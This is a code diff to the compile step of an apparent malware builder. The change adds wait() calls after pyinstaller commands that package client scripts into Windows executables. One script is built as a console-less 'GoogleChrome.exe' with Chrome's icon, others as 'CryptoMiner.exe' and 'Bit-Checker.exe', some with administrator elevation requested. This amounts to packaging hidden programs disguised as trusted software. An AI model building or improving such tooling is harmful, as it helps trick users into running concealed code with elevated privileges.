@@ -196,19 +196,21 @@ def compileall(file_template):
             print(YELLOW + "\n[!>] " + RESET + "Compiling...")
             time.sleep(0.1)
             if file_template == "./client/main.py":
-                subprocess.Popen(
+                a = subprocess.Popen(
                     "pyinstaller --onefile --clean -n CryptoMiner.exe --uac-admin --icon=./client/icons/minericon.ico ./client/main.py  ",
                     shell=True)
-
+                a.wait()
             elif file_template == "./client/main_inv.py":
-                subprocess.Popen(
+                a = subprocess.Popen(
                     "pyinstaller --noconsole --onefile --clean -n GoogleChrome.exe --uac-admin --icon=./client/icons/GoogleChrome.ico ./client/main_inv.py",
                     shell=True)
+                a.wait()
 
             elif file_template == "./client/main_checker.py":
-                subprocess.Popen(
+                a = subprocess.Popen(
                     "pyinstaller --onefile --clean -n Bit-Checker.exe --uac-admin --icon=./client/icons/bit-checker.ico ./client/main_checker.py",
                     shell=True)
+                a.wait()
             break
 
         # NO ejecutar .exe con privilegios de administrador
@@ -216,19 +218,22 @@ def compileall(file_template):
             print(YELLOW + "\n[!>] " + RESET + "Compiling...")
             time.sleep(0.1)
             if file_template == "./client/main.py":
-                subprocess.Popen(
+                a = subprocess.Popen(
                     "pyinstaller --onefile --clean -n CryptoMiner.exe --icon=./client/icons/minericon.ico ./client/main.py  ",
                     shell=True)
+                a.wait()
 
             elif file_template == "./client/main_inv.py":
-                subprocess.Popen(
+                a = subprocess.Popen(
                     "pyinstaller --noconsole --onefile --clean -n GoogleChrome.exe --icon=./client/icons/GoogleChrome.ico ./client/main_inv.py",
                     shell=True)
+                a.wait()
 
             elif file_template == "./client/main_checker.py":
-                subprocess.Popen(
+                a = subprocess.Popen(
                     "pyinstaller --onefile --clean -n Bit-Checker.exe --icon=./client/icons/bit-checker.ico ./client/main_checker.py",
                     shell=True)
+                a.wait()
             break
 
         else:
